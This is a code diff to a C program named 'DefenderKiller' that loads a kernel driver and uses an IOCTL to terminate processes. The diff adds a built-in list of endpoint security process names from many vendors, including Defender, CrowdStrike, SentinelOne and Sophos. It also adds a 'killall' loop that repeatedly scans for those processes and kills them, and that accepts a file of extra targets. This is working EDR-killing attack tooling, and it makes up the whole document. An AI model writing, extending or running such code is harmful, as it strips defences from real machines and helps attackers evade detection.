@@ -21,6 +21,53 @@
 #define SVC      "DefenderKiller"
 #define DEV      L"\\\\.\\DefenderKiller"
 
+static const char* EDR_PROCESSES[] = {
+    /* Microsoft Defender */
+    "MsMpEng.exe", "MsSense.exe", "SenseIR.exe", "SenseNdr.exe", "SenseCncProxy.exe",
+    "SenseSampleUploader.exe", "MpCmdRun.exe", "NisSrv.exe", "SecurityHealthService.exe",
+    /* CrowdStrike Falcon */
+    "CSFalconService.exe", "CSFalconContainer.exe", "csagent.exe", "falconhost.exe",
+    /* SentinelOne */
+    "SentinelAgent.exe", "SentinelServiceHost.exe", "SentinelStaticEngine.exe",
+    "SentinelStaticEngineScanner.exe", "SentinelHelperService.exe", "SentinelBrowserNativeHost.exe",
+    /* Carbon Black (VMware) */
+    "cb.exe", "RepMgr.exe", "RepUtils.exe", "RepUx.exe", "RepWAV.exe", "RepWSC.exe",
+    "cbdaemon.exe", "CbDefense.exe", "CbDefenseService.exe",
+    /* Cortex XDR (Palo Alto) */
+    "CortexXDR.exe", "cyserver.exe", "CyvrFsFlt.exe", "CyProtectDrv.exe", "cytray.exe",
+    "traps.exe", "trapsd.exe", "cyupdate.exe",
+    /* Sophos */
+    "SophosSafestore64.exe", "SophosFileScanner.exe", "SophosHealth.exe", "SophosCleanM64.exe",
+    "SophosNtpService.exe", "hmpalert.exe", "SSPService.exe", "swi_service.exe",
+    /* Elastic */
+    "elastic-agent.exe", "elastic-endpoint.exe", "winlogbeat.exe", "filebeat.exe",
+    /* Symantec / Broadcom */
+    "ccSvcHst.exe", "Rtvscan.exe", "smcgui.exe", "smc.exe", "SymCorpUI.exe", "SepMasterService.exe",
+    /* Trend Micro */
+    "Ntrtscan.exe", "TmListen.exe", "TmWSCSvc.exe", "PccNTMon.exe", "TMBMSRV.exe", "CNTAoSMgr.exe",
+    /* ESET */
+    "ekrn.exe", "egui.exe", "ERAAgent.exe",
+    /* Cylance */
+    "CylanceSvc.exe", "CylanceUI.exe", "CylanceProtectSetup.exe",
+    /* McAfee / Trellix */
+    "mfetp.exe", "mcshield.exe", "mfemactl.exe", "masvc.exe", "mfemms.exe",
+    /* Kaspersky */
+    "avp.exe", "avpui.exe", "klnagent.exe",
+    /* Bitdefender */
+    "bdagent.exe", "bdservicehost.exe", "EPSecurityService.exe", "EPIntegrationService.exe",
+    /* F-Secure / WithSecure */
+    "fshoster32.exe", "FSMA32.exe", "fsgk32.exe",
+    /* Malwarebytes */
+    "MBAMService.exe", "mbamtray.exe",
+    /* Fortinet FortiEDR */
+    "FortiEDR.exe", "fortiedr.exe", "FortiESNAC.exe",
+    /* Cybereason */
+    "ActiveConsole.exe", "CybereasonSensor.exe", "CybereasonRansomFree.exe",
+    /* Qualys */
+    "QualysAgent.exe",
+    NULL
+};
+
 typedef NTSTATUS(WINAPI* pNtQIP)(HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG);
 
 BOOL GetNtPath(WCHAR* out)
@@ -109,6 +156,37 @@ int CmdLoad(const char* path)
     return 0;
 }
 
+BOOL KillByPid(DWORD pid, const char* name)
+{
+    if (!pid || pid == 4) return FALSE;
+
+    HANDLE h = CreateFileW(DEV, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
+    if (h == INVALID_HANDLE_VALUE) return FALSE;
+
+    BYTE cmd[8] = { 0 }, out[8] = { 0 };
+    DWORD br = 0;
+    *(DWORD*)cmd = 8;
+    *(DWORD*)(cmd + 4) = pid;
+    if (!DeviceIoControl(h, IOCTL, cmd, 8, out, 8, &br, NULL))
+    {
+        CloseHandle(h);
+        return FALSE;
+    }
+
+    CloseHandle(h);
+    Sleep(300);
+
+    HANDLE hc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
+    if (!hc)
+    {
+        printf("[+] Killed %s (PID %u)\n", name ? name : "unknown", pid);
+        return TRUE;
+    }
+    CloseHandle(hc);
+    printf("[-] Failed to kill %s (PID %u)\n", name ? name : "unknown", pid);
+    return FALSE;
+}
+
 int CmdKill(const char* target)
 {
     DWORD pid = 0;
@@ -117,8 +195,6 @@ int CmdKill(const char* target)
     if (target[0] >= '0' && target[0] <= '9')
     {
         pid = atoi(target);
-        /* resolve name for display */
-        WCHAR wName[260] = { 0 };
         HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
         PROCESSENTRY32W pe; pe.dwSize = sizeof(pe);
         if (Process32FirstW(snap, &pe))
@@ -148,33 +224,118 @@ int CmdKill(const char* target)
         return 1;
     }
 
-    printf("[*] Opening device...\n");
-    HANDLE h = CreateFileW(DEV, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
-    if (h == INVALID_HANDLE_VALUE) { printf("[-] Device open failed: %lu\n", GetLastError()); return 1; }
-
-    printf("[*] Setting target PID %u...\n", pid);
-    BYTE cmd[8] = { 0 }, out[8] = { 0 };
-    DWORD br = 0;
-    *(DWORD*)cmd = 8;
-    *(DWORD*)(cmd + 4) = pid;
-    if (!DeviceIoControl(h, IOCTL, cmd, 8, out, 8, &br, NULL))
-    {
-        printf("[-] IOCTL failed: %lu\n", GetLastError()); CloseHandle(h); return 1;
-    }
-
-    printf("[*] Closing handle (triggers ZwTerminateProcess)...\n");
-    CloseHandle(h);
-    Sleep(300);
-
-    HANDLE hc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
-    if (!hc)
-    {
-        printf("[+] Process %s (PID %u) terminated\n", procName[0] ? procName : "unknown", pid);
+    if (KillByPid(pid, procName))
         return 0;
-    }
-    CloseHandle(hc);
+
     printf("[-] PID %u still alive\n", pid);
     return 1;
+}
+
+static BOOL LoadCustomTargets(const char* filePath, char targets[][260], int* count, int maxTargets)
+{
+    FILE* f = fopen(filePath, "r");
+    if (!f) return FALSE;
+
+    char line[260];
+    *count = 0;
+    while (fgets(line, sizeof(line), f) && *count < maxTargets)
+    {
+        size_t len = strlen(line);
+        while (len > 0 && (line[len - 1] == '\n' || line[len - 1] == '\r' || line[len - 1] == ' '))
+            line[--len] = 0;
+        if (len == 0 || line[0] == '#') continue;
+        strncpy(targets[*count], line, 259);
+        targets[*count][259] = 0;
+        (*count)++;
+    }
+    fclose(f);
+    return TRUE;
+}
+
+int CmdKillAll(int interval, const char* customListPath)
+{
+    if (!IsDriverLoaded())
+    {
+        printf("[-] Driver not loaded. Run 'load' first.\n");
+        return 1;
+    }
+
+    char customTargets[512][260];
+    int customCount = 0;
+
+    if (customListPath)
+    {
+        if (!LoadCustomTargets(customListPath, customTargets, &customCount, 512))
+        {
+            printf("[-] Failed to read custom target list: %s\n", customListPath);
+            return 1;
+        }
+        printf("[*] Loaded %d custom targets from %s\n", customCount, customListPath);
+    }
+
+    int builtinCount = 0;
+    for (int i = 0; EDR_PROCESSES[i] != NULL; i++) builtinCount++;
+
+    int totalTargets = builtinCount + customCount;
+    printf("[*] EDR killer loop started (%d built-in + %d custom targets)\n", builtinCount, customCount);
+    printf("[*] Scan interval: %d ms\n", interval);
+    printf("[*] Press Ctrl+C to stop\n\n");
+
+    int totalKilled = 0;
+    int sweepNum = 0;
+
+    while (TRUE)
+    {
+        sweepNum++;
+        int killedThisSweep = 0;
+
+        HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+        if (snap == INVALID_HANDLE_VALUE) { Sleep(interval); continue; }
+
+        PROCESSENTRY32W pe;
+        pe.dwSize = sizeof(pe);
+
+        if (Process32FirstW(snap, &pe))
+        {
+            do
+            {
+                if (pe.th32ProcessID == 0 || pe.th32ProcessID == 4) continue;
+
+                char nameA[260] = { 0 };
+                WideCharToMultiByte(CP_ACP, 0, pe.szExeFile, -1, nameA, 260, NULL, NULL);
+
+                BOOL match = FALSE;
+                for (int i = 0; EDR_PROCESSES[i] != NULL; i++)
+                {
+                    if (_stricmp(nameA, EDR_PROCESSES[i]) == 0) { match = TRUE; break; }
+                }
+                if (!match)
+                {
+                    for (int i = 0; i < customCount; i++)
+                    {
+                        if (_stricmp(nameA, customTargets[i]) == 0) { match = TRUE; break; }
+                    }
+                }
+
+                if (match)
+                {
+                    if (KillByPid(pe.th32ProcessID, nameA))
+                    {
+                        killedThisSweep++;
+                        totalKilled++;
+                    }
+                }
+            } while (Process32NextW(snap, &pe));
+        }
+        CloseHandle(snap);
+
+        if (killedThisSweep > 0)
+            printf("[*] Sweep #%d: killed %d processes (total: %d)\n", sweepNum, killedThisSweep, totalKilled);
+
+        Sleep(interval);
+    }
+
+    return 0;
 }
 
 int CmdUnload(void)
@@ -230,7 +391,11 @@ int main(int argc, char** argv)
         printf("  Usage:\n");
         printf("    %s load <driver_path>\n", argv[0]);
         printf("    %s kill <PID | process_name>\n", argv[0]);
+        printf("    %s killall [--interval <ms>] [--list <file>]\n", argv[0]);
         printf("    %s unload\n\n", argv[0]);
+        printf("  killall options:\n");
+        printf("    --interval <ms>   Sweep interval in milliseconds (default: 500)\n");
+        printf("    --list <file>     Additional process names to target (one per line)\n\n");
         return 1;
     }
 
@@ -244,6 +409,21 @@ int main(int argc, char** argv)
     {
         if (argc < 3) { printf("[-] Usage: %s kill <PID | process_name>\n", argv[0]); return 1; }
         return CmdKill(argv[2]);
+    }
+
+    if (_stricmp(argv[1], "killall") == 0)
+    {
+        int interval = 500;
+        const char* listPath = NULL;
+        for (int i = 2; i < argc; i++)
+        {
+            if (_stricmp(argv[i], "--interval") == 0 && i + 1 < argc)
+                interval = atoi(argv[++i]);
+            else if (_stricmp(argv[i], "--list") == 0 && i + 1 < argc)
+                listPath = argv[++i];
+        }
+        if (interval < 100) interval = 100;
+        return CmdKillAll(interval, listPath);
     }
 
     if (_stricmp(argv[1], "unload") == 0)
